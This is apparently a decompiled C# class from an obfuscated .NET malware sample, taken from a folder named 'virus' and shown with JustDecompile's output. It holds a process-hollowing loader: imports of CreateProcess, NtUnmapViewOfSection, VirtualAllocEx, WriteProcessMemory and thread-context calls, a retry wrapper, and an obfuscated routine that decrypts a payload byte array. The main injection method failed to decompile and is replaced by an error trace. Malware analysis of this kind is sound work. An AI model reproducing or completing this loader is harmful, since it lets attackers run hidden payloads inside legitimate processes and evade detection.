using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;

internal class _______________________________________________________________________
{
	public _______________________________________________________________________()
	{
	}

	public static bool ___________(string string_0, string string_1, byte[] byte_0, bool bool_0, bool bool_1 = false, bool bool_2 = false)
	{
		bool flag;
		int num = 0;
		try
		{
			if (File.Exists(string_0))
			{
				if (bool_1)
				{
					object length = Type.EmptyTypes.Length + 0;
					while (true)
					{
						switch (length)
						{
							case 0:
							{
								byte[] byte0 = byte_0;
								byte_0 = ___________________________________________________________________._______(byte0, <Module>.__________(((39 & 40 * num + num * 2041577472 + 24 * num) == 0 ? Type.EmptyTypes.Length + 536 : Type.EmptyTypes.Length + -1218376522), (int)(sizeof(long) + 4087), 168));
								length = sizeof(ushort) + -1;
								continue;
							}
							case 1:
							{
								break;
							}
							default:
							{
								goto case 0;
							}
						}
					}
				}
				num = 1;
				while (!_______________________________________________________________________.____________(string_0, string_1, byte_0, bool_0, bool_2))
				{
					num++;
					if (num <= 5)
					{
						continue;
					}
					flag = false;
					return flag;
				}
				flag = true;
			}
			else
			{
				flag = false;
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			flag = false;
			ProjectData.ClearProjectError();
		}
		return flag;
	}

	private static bool ____________(string string_0, string string_1, byte[] byte_0, bool bool_0, bool bool_1)
	{
		// 
		// Current member / type: System.Boolean _______________________________________________________________________::____________(System.String,System.String,System.Byte[],System.Boolean,System.Boolean)
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Boolean ____________(System.String,System.String,System.Byte[],System.Boolean,System.Boolean)
		// 
		// Intervails are more than in the last iteration.
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 108
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	[DllImport("kernel32.dll", CharSet=CharSet.Unicode, ExactSpelling=false)]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool CreateProcess(string string_0, string string_1, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, uint uint_0, IntPtr intptr_2, string string_2, ref _______________________________________________________________________._________________________________________________________________________ __________________________________________________________________________0, ref _______________________________________________________________________.________________________________________________________________________ _________________________________________________________________________0);

	[DllImport("kernel32.dll", CharSet=CharSet.None, ExactSpelling=false)]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool GetThreadContext(IntPtr intptr_0, int[] int_0);

	[DllImport("ntdll.dll", CharSet=CharSet.None, ExactSpelling=false)]
	[SuppressUnmanagedCodeSecurity]
	private static extern int NtUnmapViewOfSection(IntPtr intptr_0, int int_0);

	[DllImport("kernel32.dll", CharSet=CharSet.None, ExactSpelling=false)]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool ReadProcessMemory(IntPtr intptr_0, int int_0, ref int int_1, int int_2, ref int int_3);

	[DllImport("kernel32.dll", CharSet=CharSet.None, ExactSpelling=false)]
	[SuppressUnmanagedCodeSecurity]
	private static extern int ResumeThread(IntPtr intptr_0);

	[DllImport("kernel32.dll", CharSet=CharSet.None, ExactSpelling=false)]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool SetThreadContext(IntPtr intptr_0, int[] int_0);

	[DllImport("kernel32.dll", CharSet=CharSet.None, ExactSpelling=false)]
	[SuppressUnmanagedCodeSecurity]
	private static extern int VirtualAllocEx(IntPtr intptr_0, int int_0, int int_1, int int_2, int int_3);

	[DllImport("kernel32.dll", CharSet=CharSet.None, ExactSpelling=false)]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool Wow64GetThreadContext(IntPtr intptr_0, int[] int_0);

	[DllImport("kernel32.dll", CharSet=CharSet.None, ExactSpelling=false)]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool Wow64SetThreadContext(IntPtr intptr_0, int[] int_0);

	[DllImport("kernel32.dll", CharSet=CharSet.None, ExactSpelling=false)]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool WriteProcessMemory(IntPtr intptr_0, int int_0, byte[] byte_0, int int_1, ref int int_2);

	private struct ________________________________________________________________________
	{
		public IntPtr _;

		public IntPtr __;

		public uint ___;

		public uint ____;
	}

	private struct _________________________________________________________________________
	{
		public int _;

		public string __;

		public string ___;

		public string ____;

		public int _____;

		public int ______;

		public int _______;

		public int ________;

		public int _________;

		public int __________;

		public int ___________;

		public int ____________;

		public short _____________;

		public short ______________;

		public int _______________;

		public int ________________;

		public int _________________;

		public int __________________;
	}
}